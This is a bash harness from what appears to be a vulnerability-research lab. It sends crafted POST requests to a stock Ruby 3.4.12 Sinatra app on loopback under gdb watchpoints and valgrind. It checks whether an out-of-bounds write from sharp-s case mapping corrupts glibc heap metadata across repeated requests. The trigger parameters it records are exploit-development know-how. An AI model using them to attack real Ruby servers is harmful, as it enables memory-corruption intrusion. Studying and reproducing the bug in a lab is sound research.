#!/bin/bash
# W384: on the W382/W383 1024 SURVIVOR family, drive EIGHT wire requests in
# ONE fresh plain 3.4.12 Sinatra process under the committed W379 hardware
# WRITE watchpoints (observability only; no debugger writes, no middleware).
#
# Request 1 always has post-field length 64; requests 2-8 are all 1024.
# Sharp-s count is 27 on every request (W381: OOB byte hits the next glibc
# chunk's size LSB). All requests are ordinary python3 wire invocations
# against the unmodified stock app on loopback.
#
# Prediction (operator #7295): a later request eventually reuses and unlinks
# the chunk whose size LSB request 2 corrupted. Falsifier: a valid survivor
# serves all eight requests with the same 650-byte 404 digest, no allocator
# fault and no unlink frame — persistence is not bounded by request count.
# Arms with incomplete folds or a pre-existing 0x54 sizeword are preserved as
# anomalies and never counted as falsifier survivals.
#
# Usage (paths relative to the repository root, free loopback ports required):
#   bash lab/repro/ruby2shell-w384-depth.sh arms 5100 \
#       lab/build/evidence/casemap-chain/w384/smoke 1
#   bash lab/repro/ruby2shell-w384-depth.sh arms 5120 \
#       lab/build/evidence/casemap-chain/w384/arms 8
#   bash lab/repro/ruby2shell-w384-depth.sh controls 5140 \
#       lab/build/evidence/casemap-chain/w384/controls
# Arm N of a round uses FIRSTPORT+N; every port is checked before use because
# a stale server would let curl readiness succeed while this process died
# EADDRINUSE.
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-}" FIRSTPORT="${2:-}" OUT="${3:-}" NARMS="${4:-8}"
case "$MODE" in
  arms|controls) ;;
  *) echo "usage: $0 arms|controls FIRSTPORT OUTDIR [NARMS]" >&2; exit 2 ;;
esac
case "$FIRSTPORT" in ''|*[!0-9]*) echo "FIRSTPORT must be a port number" >&2; exit 2 ;; esac
case "$NARMS" in ''|*[!0-9]*) echo "NARMS must be a number" >&2; exit 2 ;; esac
[ "$NARMS" -ge 1 ] || { echo "NARMS must be >= 1" >&2; exit 2; }
[ -n "$OUT" ] || { echo "OUTDIR required" >&2; exit 2; }
mkdir -p "$OUT" || exit 1
SUMMARY="$OUT/summary.txt"
: > "$SUMMARY"

GDBSCRIPT="$PWD/lab/repro/ruby2shell-w379-wire-watch.gdb"
VGEMS="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
VBIN="$PWD/lab/build/plain/ruby-3.4.12-plain/bin/ruby"
APP="$PWD/lab/repro/ruby2shell-stock-baseline.ru"
WIRE="$PWD/lab/repro/ruby2shell-w371-wire.py"
DIGEST='response-len=650 response-sha256=1e07f7bb201b15f974654de84612acc1c572177a8fb07fbacfa5b6e4ab9c961f'
REQ_TOTAL=8

port_free() {
  if ss -ltn 2>/dev/null | grep -qE "[:.]$1[[:space:]]"; then
    echo "port $1 busy; arm SKIPPED" | tee -a "$SUMMARY"
    return 1
  fi
  return 0
}

wire_request() {
  # wire_request PORT POSTLEN OUTPUT
  RUBY2SHELL_W371_SURFACES=method-postfield-size \
  RUBY2SHELL_W377_POSTLEN="$2" \
  RUBY2SHELL_W378_COUNT=1 RUBY2SHELL_W380_COUNT=27 \
  RUBY2SHELL_W376_RESPONSE=1 \
    python3 "$WIRE" "$1" POST > "$3" 2>&1
}

arm() {
  local port="$1" tag="$2"
  local out="$OUT/$tag.gdb.out"
  local gdbpid child ready=NO alive=NO abort=NO unlink=NO pre54=NO valid=NO
  local i len oks=0 folds traps alive_after=0
  port_free "$port" || return 2
  echo "== START $tag port=$port req1=64 req2-8=1024 $(date -u +%H:%M:%SZ)"
  export GEM_PATH="$VGEMS${GEM_PATH:+:$GEM_PATH}"
  export RUBY2SHELL_STOCK_PORT="$port"
  export R2S_W379_ABORT_BT=1
  setsid gdb -q -batch -x "$GDBSCRIPT" --args "$VBIN" "$APP" > "$out" 2>&1 &
  gdbpid=$!
  for _ in $(seq 1 240); do
    child=$(pgrep -P "$gdbpid" | head -1)
    if curl -s -m 1 "http://127.0.0.1:$port/" >/dev/null 2>&1; then ready=YES; break; fi
    sleep 0.25
  done
  if [ "$ready" = YES ]; then
    for i in $(seq 1 "$REQ_TOTAL"); do
      if [ "$i" -eq 1 ]; then len=64; else len=1024; fi
      wire_request "$port" "$len" "$OUT/$tag.wire$i"
      if grep -qF "$DIGEST" "$OUT/$tag.wire$i"; then oks=$((oks+1)); fi
      sleep 0.2
      if kill -0 "$child" 2>/dev/null; then
        alive_after="$i"
      else
        break
      fi
    done
    sleep 2
    if kill -0 "$child" 2>/dev/null; then alive=YES; fi
  fi
  folds=$(grep -c '^W379CALL' "$out" || true)
  traps=$(grep -c '^W379TRAP' "$out" || true)
  case "$(grep -m1 '^W379CALL' "$out" || true)" in *sizeword=0x54*) pre54=YES ;; esac
  if grep -qiE 'corrupted size|malloc_printerr|SIGABRT|Aborted' "$out"; then abort=YES; fi
  if grep -qiE 'unlink_chunk|_int_realloc|malloc_printerr' "$out"; then unlink=YES; fi
  if [ "$oks" -eq "$REQ_TOTAL" ] && [ "$folds" -eq "$REQ_TOTAL" ] &&
     [ "$pre54" = NO ] && [ "$abort" = NO ] && [ "$unlink" = NO ] &&
     [ "$alive" = YES ]; then valid=YES; fi
  {
    echo "== $tag port=$port ready=$ready oks=$oks/$REQ_TOTAL alive_after=$alive_after alive=$alive abort=$abort unlink_frame=$unlink folds=$folds traps=$traps preexisting_0x54=$pre54 valid_survivor=$valid"
    for i in $(seq 1 "$REQ_TOTAL"); do
      echo "-- request$i postlen=$([ "$i" -eq 1 ] && echo 64 || echo 1024)"
      grep -E '^surface=.*(head|response-len)' "$OUT/$tag.wire$i" 2>/dev/null | cut -c1-140 || true
    done
    echo "-- fold calls, traps and summary (sizeword is pre-write; trap dump +8 is next chunk's sizeword)"
    grep -E '^W379CALL' "$out" | cut -c1-220 || true
    grep -E '^W379TRAP' "$out" | cut -c1-300 || true
    grep -E '^W379SUMMARY' "$out" || true
    echo "-- abort frames (full backtrace on abort when R2S_W379_ABORT_BT=1)"
    grep -A14 '^W382ABORT_BT' "$out" | head -15 || true
    grep -iE 'corrupted size vs|malloc_printerr|unlink_chunk|_int_realloc|SIGABRT' "$out" | head -6 || true
  } >> "$SUMMARY"
  kill -TERM "$child" 2>/dev/null
  for _ in $(seq 1 60); do kill -0 "$gdbpid" 2>/dev/null || break; sleep 0.1; done
  kill -KILL "$gdbpid" 2>/dev/null
  wait "$gdbpid" 2>/dev/null
  echo "== $tag ready=$ready oks=$oks/$REQ_TOTAL alive=$alive abort=$abort unlink=$unlink folds=$folds traps=$traps pre54=$pre54 valid=$valid"
}

control() {
  local kind="$1" app="$2" build="$3" sharp="$4" surface="$5" port="$6" tag="$7"
  port_free "$port" || return 2
  echo "== START $tag ($kind $app $build sharp=$sharp $surface) $(date -u +%H:%M:%SZ)"
  RUBY2SHELL_W369_PORT="$port" \
  RUBY2SHELL_W369_WIRE=lab/repro/ruby2shell-w371-wire.py \
  RUBY2SHELL_W371_SURFACES="$surface" \
  RUBY2SHELL_W377_POSTLEN=64 RUBY2SHELL_W380_COUNT="$sharp" \
  RUBY2SHELL_W376_RESPONSE=1 RUBY2SHELL_W369_TAG="$tag" \
    bash lab/repro/ruby2shell-w369-pair.sh "$kind" "$app" "$build"
  local vg="lab/build/evidence/casemap-chain/w369/valgrind-${app}-${build}/${tag}.valgrind"
  local cout="lab/build/evidence/casemap-chain/w369/valgrind-${app}-${build}/${tag}.out"
  {
    echo "== $tag (sharp=$sharp $app $build $surface)"
    grep -E '^(invalid-writes|invalid-reads|case_map-errors|ready=|process-alive)' "$cout" || true
    grep -iE 'at 0x[0-9a-f]+: case_map' "$vg" | sort | uniq -c || true
    grep -iE 'Address 0x[0-9a-f]+ is [0-9]+ bytes (after|before|inside) a block of size [0-9]+' "$vg" | sort | uniq -c || true
  } >> "$SUMMARY"
}

if [ "$MODE" = arms ]; then
  i=0
  for port in $(seq "$FIRSTPORT" "$((FIRSTPORT+NARMS-1))"); do
    arm "$port" "a$i"
    i=$((i+1))
  done
  [ "$i" -eq "$NARMS" ] || { echo "expected $NARMS arms, ran $i" | tee -a "$SUMMARY"; exit 2; }
else
  control valgrind sinatra vuln 20 method-postfield-size-safe "$FIRSTPORT" w384-vg-safe20
  control valgrind rails fixed 27 method-postfield-size "$((FIRSTPORT+1))" w384-vg-fixed27
fi
cat "$SUMMARY"
